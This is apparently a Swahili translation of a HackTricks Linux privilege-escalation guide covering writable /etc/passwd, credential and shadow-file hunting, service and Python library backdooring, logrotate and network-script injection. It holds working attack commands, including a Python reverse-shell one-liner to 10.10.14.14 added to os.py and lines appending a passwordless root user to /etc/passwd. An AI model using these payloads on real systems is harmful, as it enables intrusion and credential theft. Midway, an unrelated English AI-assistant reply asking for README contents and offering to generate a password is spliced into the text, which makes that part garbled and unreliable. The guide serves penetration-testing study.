Ikiwa unagundua kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia vibaya kupata ruhusa za juu**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zilizovutia

### Faili za profaili

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts ambazo zinaendeshwa wakati mtumiaji anapoendesha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kuhariri yeyote kati yao unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script yoyote isiyo ya kawaida ya profaili inapopatikana, unapaswa kuiangalia kwa ajili ya **maelezo nyeti**.

### Passwd/Shadow Faili

Kulingana na OS, faili `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na chelezo. Kwa hivyo inashauriwa **kutafuta zote** na **kuangalia kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Wakati mwingine unaweza kupata **password hashes** ndani ya `/etc/passwd` (au faili sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza password kwa kutumia mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md contents. Please paste the content of src/linux-hardening/privilege-escalation/README.md that you want translated. 

Also confirm:
- Do you want me to generate a strong password now? (I can include it in the translated file.)
- Should I add a line in the translated file with the user creation command (e.g. useradd + password setup), or just add a note with the username `hacker` and the generated password?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Kwa njia mbadala, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\ ONYO: unaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika mifumo ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika katika **faili ya usanidi ya huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** server na unaweza **kubadilisha faili ya usanidi ya huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara ijayo tomcat itakapowashwa.

### Check Folders

Folda zifuatazo zinaweza kuwa na backups au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda usiweze kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Isiyo ya Kawaida/Owned faili
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za hivi punde
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za DB za Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mifaili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripti/Bainari katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zinazoweza kuwa na neno la siri

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na neno la siri**.\
**Zana nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya chanzo wazi inayotumika kurejesha nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logi, unaweza kupata **taarifa za kuvutia/za siri ndani yao**. Kadri logi inavyokuwa ya ajabu zaidi, ndivyo itakavyovutia zaidi (labda).\
Pia, baadhi ya "**mbaya**" sanidiwa (backdoored?) **audit logs** zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa kwenye chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma majarida kikundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa cha msaada sana.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zinazojumuisha neno "**password**" katika **jina** lake au ndani ya **maudhui**, na pia kuangalia IPs na emails ndani ya logs, au regexps za hashes.\
Sitaorodhesha hapa jinsi ya kufanya yote haya, lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) inayofanya.

## Mafaili yanayoweza kuandikwa

### Python library hijacking

Ikiwa unajua **wapi** script ya python itatekelezwa na unaweza **kuandika ndani** ya saraka hiyo au unaweza **modify python libraries**, unaweza kuhariri OS library na kuiweka backdoor (ikiwa unaweza kuandika mahali script ya python itakapotekelezwa, nakili na bandika os.py library).

Ili **backdoor the library**, ongeza mwishoni mwa os.py library mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Utekelezaji wa logrotate

Udhaifu ndani ya `logrotate` unamruhusu mtumiaji mwenye **write permissions** kwenye faili ya log au kwenye directory zake za mzazi kupata **escalated privileges**. Hii ni kwa sababu `logrotate`, mara nyingi ikiendeshwa na **root**, inaweza kuchezeshwa ili ku-execute faili yoyote, hasa katika directories kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua permissions sio tu katika _/var/log_ bali pia katika directory yoyote ambapo log rotation inatumika.

> [!TIP]
> Udhuifu huu unahusu toleo la `logrotate` `3.18.0` na za zamani

Taarifa za kina kuhusu udhaifu zinaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza ku-exploit udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhuifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua unaweza kubadilisha logs, angalia nani anasimamia logs hizo na angalia kama unaweza kupata escalated privileges kwa kubadili logs kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Iwapo, kwa sababu yoyote ile, mtumiaji anaweza **write** script ya `ifcf-<whatever>` katika _/etc/sysconfig/network-scripts_ **au** anaweza **adjust** ile iliyopo, basi **system yako imepwned**.

Network scripts, _ifcg-eth0_ kwa mfano, hutumika kwa unganisho la network. Zinajionyesha kama faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, thamani ya `NAME=` katika network scripts hizi haishughulikiwi vizuri. Ikiwa jina lina **white/blank space** mfumo unajaribu ku-execute sehemu baada ya white/blank space. Hii inamaanisha kwamba **kila kitu kilicho baada ya eneo la kwanza tupu kinaendeshwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Saraka `/etc/init.d` ni makazi ya **scripts** za System V init (SysVinit), **mfumo wa jadi wa usimamizi wa huduma za Linux**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zilizopo katika `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inaunganishwa na **Upstart**, mfumo mpya wa **usimamizi wa huduma** ulioletwa na Ubuntu, unaotumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kuelekea Upstart, scripts za SysVinit bado zinatumiwa pamoja na usanidi wa Upstart kutokana na tabaka la ulinganifu ndani ya Upstart.

**systemd** ni mfumo wa kisasa wa kuanzisha na kusimamia huduma, ukitoa vipengele vya juu kama kuanzisha daemon kwa mahitaji, usimamizi wa automount, na snapshots za hali ya mfumo. Inaweka faili ndani ya `/usr/lib/systemd/` kwa ajili ya packages za distribution na `/etc/systemd/system/` kwa marekebisho ya msimamizi, ikirahisisha usimamizi wa mfumo.

## Mbinu Zingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks mara nyingi hu-hook syscall ili kufichua uwezo wa kernel uliobarikiwa kwa manager wa userspace. Uthibitishaji dhaifu wa manager (mfano, ukaguzi wa signature unaotegemea FD-order au mipango ya nywila duni) unaweza kumwezesha app ya ndani kuiga manager na ku-escalate hadi root kwenye vifaa ambavyo tayari vimeshakuwa root. Jifunze zaidi na undani wa uadui hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Ugunduzi wa huduma unaotegemea regex ndani ya VMware Tools/Aria Operations unaweza kutoa path ya binary kutoka kwa mistari ya amri ya mchakato na kuiendesha kwa -v ndani ya muktadha wenye ruhusa. Mifumo ya regex yenye huruma (mfano, kutumia \S) inaweza kuendana na listeners waliowekwa na mshambuliaji katika maeneo yanayoweza kuandikwa (mfano, /tmp/httpd), ikisababisha utekelezaji kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone muundo wa jumla unaofaa kwa stacks nyingine za discovery/monitoring hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Zana bora ya kutafuta Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
